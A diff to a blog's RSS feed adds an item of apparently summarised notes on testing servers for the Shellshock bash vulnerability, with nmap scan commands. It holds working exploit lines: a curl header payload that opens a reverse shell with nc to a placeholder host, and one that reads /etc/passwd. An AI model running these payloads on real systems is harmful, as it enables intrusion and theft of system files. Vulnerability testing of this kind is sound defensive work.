@@ -98,4 +98,25 @@
 &lt;li>User Management&lt;/li>
 &lt;li>Automated Updates&lt;/li>
 &lt;li>Network Configuration&lt;/li>
-&lt;/ol></description></item></channel></rss>
+&lt;/ol></description></item><item><title>Test Whether a Server Is Vulnerable to Shellshock Bug</title><link>https://linzeyan.github.io/zh-tw/posts/20221128-linux-shellshock-bug/</link><pubDate>Mon, 28 Nov 2022 15:35:30 +0800</pubDate><guid>https://linzeyan.github.io/zh-tw/posts/20221128-linux-shellshock-bug/</guid><description>&lt;ul>
+&lt;li>&lt;a href="https://www.baeldung.com/linux/shellshock-bug" target="_blank" rel="noopener">Test Whether a Server Is Vulnerable to Shellshock Bug&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;h5 id="the-shellshock-bug">The Shellshock Bug&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>env x&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39; () {:;};&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h5 id="exploiting-shellshock-bug">Exploiting Shellshock Bug&lt;/h5>
+&lt;ul>
+&lt;li>A substituted command is executed since the feature ignores the command specified by the user, and instead, it runs that which the ForceCommand defines.&lt;/li>
+&lt;li>The ignored commands from the user are put in the &amp;ldquo;SSH_ORIGINAL_COMMAND&amp;rdquo; environment variable. If the user&amp;rsquo;s default shell is Bash, the Bash shell will parse the value of the &amp;ldquo;SSH_ORIGINAL_COMMAND&amp;rdquo; environment variable on start-up and run the embedded commands.&lt;/li>
+&lt;/ul>
+&lt;h5 id="examples-of-shellshock-exploit-commands">Examples of Shellshock Exploit Commands&lt;/h5>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">## 1&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl -H &lt;span style="color:#e6db74">&amp;#34;X-Frame-Options: () {:;};echo;/bin/nc -e /bin/bash 192.168.y.y 443&amp;#34;&lt;/span> 192.168.x.y/CGI-bin/hello.cgi
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">## 2&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>curl --insecure 192.168.x.x -H &lt;span style="color:#e6db74">&amp;#34;User-Agent: () { :; }; /bin/cat /etc/passwd&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>use nmap script to test for the vulnerability&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>nmap -sV -p- --script http-shellshock 192.168.x.x
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nmap -sV -p- --script http-shellshock --script-args uri&lt;span style="color:#f92672">=&lt;/span>/cgi-bin/bin,cmd&lt;span style="color:#f92672">=&lt;/span>ls 192.168.x.x
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>
